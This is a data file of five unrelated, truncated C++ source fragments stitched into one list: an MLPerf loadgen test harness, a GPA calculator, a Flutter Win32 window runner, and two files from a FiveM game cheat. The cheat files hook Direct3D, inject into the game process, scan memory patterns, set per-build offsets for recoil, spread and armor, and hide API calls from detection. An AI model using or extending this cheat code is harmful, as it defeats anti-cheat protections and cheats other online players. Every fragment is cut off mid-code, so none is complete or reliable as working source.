    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "/*\n * Copyright (c) 2020, NVIDIA CORPORATION.  All rights reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cassert>\n#include <condition_variable>\n#include <deque>\n#include <iostream>\n#include <map>\n#include <mutex>\n#include <thread>\n#include <vector>\n\n#include \"loadgen.h\"\n#include \"query_sample_library.h\"\n#include \"system_under_test.h\"\n#include \"test_settings.h\"\n\nclass QSL : public mlperf::QuerySampleLibrary {\n public:\n  ~QSL() override{};\n  const std::string& Name() override { return mName; }\n  size_t TotalSampleCount() override { return 1000000; }\n  size_t PerformanceSampleCount() override { return TotalSampleCount(); }\n  void LoadSamplesToRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n  void UnloadSamplesFromRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n\n private:\n  std::string mName{\"Dummy QSL\"};\n};\n\nclass BasicSUT : public mlperf::SystemUnderTest {\n public:\n  BasicSUT() {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n  }\n  ~BasicSUT() override {}\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    int n = samples.size();\n    if (n > mResponses.size()) {\n      std::cerr << \"Warning: reallocating response buffer in BasicSUT. Maybe \"\n                   \"you should initResponse with larger value!?\"\n                << std::endl;\n      initResponse(samples.size());\n    }\n    for (int i = 0; i < n; i++) {\n      mResponses[i].id = samples[i].id;\n    }\n    mlperf::QuerySamplesComplete(mResponses.data(), n);\n  }\n  void FlushQueries() override {}\n\n private:\n  void initResponse(int size) {\n    mResponses.resize(size,\n                      {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n  }\n  int mBuf{0};\n  std::string mName{\"BasicSUT\"};\n  std::vector<mlperf::QuerySampleResponse> mResponses;\n};\n\nclass QueueSUT : public mlperf::SystemUnderTest {\n public:\n  QueueSUT(int numCompleteThreads, int maxSize) {\n    // Each thread handle at most maxSize at a time.\n    std::cout << \"QueueSUT: maxSize = \" << maxSize << std::endl;\n    initResponse(numCompleteThreads, maxSize);\n    // Launch complete threads\n    for (int i = 0; i < numCompleteThreads; i++) {\n      mThreads.emplace_back(&QueueSUT::CompleteThread, this, i);\n    }\n  }\n  ~QueueSUT() override {\n    {\n      std::unique_lock<std::mutex> lck(mMtx);\n      mDone = true;\n      mCondVar.notify_all();\n    }\n    for (auto& thread : mThreads) {\n      thread.join();\n    }\n  }\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    std::unique_lock<std::mutex> lck(mMtx);\n    for (const auto& sample : samples) {\n      mIdQueue.push_back(sample.id);\n    }\n    // Let some worker thread to consume tasks\n    mCondVar.notify_one();\n  }\n  void FlushQueries() override {}\n\n private:\n  void CompleteThread(int threadIdx) {\n    auto& responses = mResponses[threadIdx];\n    size_t maxSize{responses.size()};\n    size_t actualSize{0};\n    while (true) {\n      {\n        std::unique_lock<std::mutex> lck(mMtx);\n        mCondVar.wait(lck, [&]() { return !mIdQueue.empty() || mDone; });\n\n        if (mDone) {\n          break;\n        }\n\n        actualSize = std::min(maxSize, mIdQueue.size());\n        for (int i = 0; i < actualSize; i++) {\n          responses[i].id = mIdQueue.front();\n          mIdQueue.pop_front();\n        }\n        mCondVar.notify_one();\n      }\n      mlperf::QuerySamplesComplete(responses.data(), actualSize);\n    }\n  }\n  void initResponse(int numCompleteThreads, int size) {\n    mResponses.resize(numCompleteThreads);\n    for (auto& responses : mResponses) {\n      responses.resize(size,\n                       {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n    }\n  }\n  int mBuf{0};\n  std::string mName{\"QueueSUT\"};\n  std::vector<std::vector<mlperf::QuerySampleResponse>> mResponses;\n  std::vector<std::thread> mThreads;\n  std::deque<mlperf::ResponseId> mIdQueue;\n  std::mutex mMtx;\n  std::condition_variable mCondVar;\n  bool mDone{false};\n};\n\nclass MultiBasicSUT : public mlperf::SystemUnderTest {\n public:\n  MultiBasicSUT(int numThreads)\n      : mNumThreads(numThreads), mResponses(numThreads) {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n    for (int i = 0; i < mNumThreads; ++i) {\n      mThreads.emplace_back(&MultiBasicSUT::startIss",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\n\nvoid calculateSubjectGPA();\nvoid calculateSemesterCGPA();\nvoid displayCalculationMethod();\nvoid showMainMenu();\nvoid displayJKishoreKumar();\nint main() {\n    showMainMenu();\n    return 0;\n}\n\nvoid clearScreen() {\n    cout << \"\\033[2J\\033[1;1H\";\n}\n\nvoid showMainMenu() {\n    int choice;\n    while (true) {\n        clearScreen();\n        cout << \"\\033[1;36m\";\n        cout<<\"      \"<<\"SEMESTER GRADE CALCULATION\"<< endl;\n        cout << \"\\033[0m\";\n        cout << \"******************************************************\" << endl;\n        cout << \"                   MAIN MENU\" << endl;\n        cout << \"******************************************************\" << endl;\n        cout << \"  \\033[1;32m1. Calculate Subject GPA\\033[0m\" << endl;\n        cout << \"  \\033[1;33m2. Calculate Semester CGPA\\033[0m\" << endl;\n        cout << \"  \\033[1;35m3. Display Calculation Method\\033[0m\" << endl;\n        cout << \"  \\033[1;31m4. Exit Application\\033[0m\" << endl;\n        cout << \"******************************************************\" << endl;\n        cout << \"Enter your choice (1-4): \";\n        cin >> choice;\n        \n        switch (choice) {\n            case 1:\n                calculateSubjectGPA();\n                break;\n            case 2:\n                calculateSemesterCGPA();\n                break;\n            case 3:\n                displayCalculationMethod();\n                break;\n            case 4:\n               \n                      \n                displayJKishoreKumar();\n                cout << endl;\n                cout << \"\\033[0m\";\n                exit(EXIT_SUCCESS);\n            default:\n                cout << \"\\033[1;31m\";\n                cout << \"Invalid input. Please enter a number between 1 and 4.\" << endl;\n                cout << \"\\033[0m\";\n                cout << \"Press Enter to continue...\";\n                cin.ignore();\n                cin.get();\n        }\n    }\n}\n\nvoid calculateSubjectGPA() {\n    clearScreen();\n    int numSubjects;\n    cout << \"******************************************************\" << endl;\n    cout << \"            \\033[1;32mCalculate Subject GPA\\033[0m                     \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Enter the number of subjects: \";\n    cin >> numSubjects;\n\n    float credits[numSubjects];\n    float points[numSubjects];\n\n    float totalPoints = 0, totalCredits = 0;\n\n    for (int i = 0; i < numSubjects; ++i) {\n        cout << \"Subject \" << i + 1 << \":\" << endl;\n        cout << \"  - Enter credit: \";\n        cin >> credits[i];\n        cout << \"  - Enter point: \";\n        cin >> points[i];\n        totalPoints += credits[i] * points[i];\n        totalCredits += credits[i];\n    }\n\n    cout << \"******************************************************\" << endl;\n    cout << \"Total GPA: \" << (totalPoints / totalCredits) << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid calculateSemesterCGPA() {\n    clearScreen();\n    int numSemesters;\n    cout << \"******************************************************\" << endl;\n    cout << \"          \\033[1;33mCalculate Semester CGPA\\033[0m                     \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Enter the number of semesters: \";\n    cin >> numSemesters;\n\n    float semesterGPA[numSemesters];\n    float totalGPA = 0;\n    float totalGradingPoints = 0;\n\n    for (int i = 0; i < numSemesters; ++i) {\n        cout << \"Semester \" << i + 1 << \":\" << endl;\n        cout << \"  - Enter GPA: \";\n        cin >> semesterGPA[i];\n        cout << \"  - Enter total grading points: \";\n        float Points;\n        cin >> Points;\n        totalGradingPoints+=Points;\n        totalGPA += (semesterGPA[i]*Points);\n    }\n\n    cout << \"******************************************************\" << endl;\n    cout << \"CGPA: \" << (totalGPA / totalGradingPoints) << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid displayCalculationMethod() {\n    clearScreen();\n    cout << \"******************************************************\" << endl;\n    cout << \"          \\033[1;35mMethod of Calculating GPA & CGPA\\033[0m            \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"GPA = Sum of (Credit * Point) / Total Credits\" << endl;\n    cout << \"CGPA = Sum of (GPA * Total Grading Points) / Sum of Total Grading Points\" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid displayJKishoreKumar() {\n    clearScreen();\n  cout << \"Thank you for using the GPA & CGPA Calculator. Goodbye!\" << endl;\n                cout << \"\\033[1;33m\";\n                cout << \"Done by \";\n    cout << \"\\033[1;31mJ\";\n    cout << \"\\033[1;33m.\";\n    cout << \"\\033[1;32mK\";\n    cout << \"\\033[1;34mI\";\n   ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
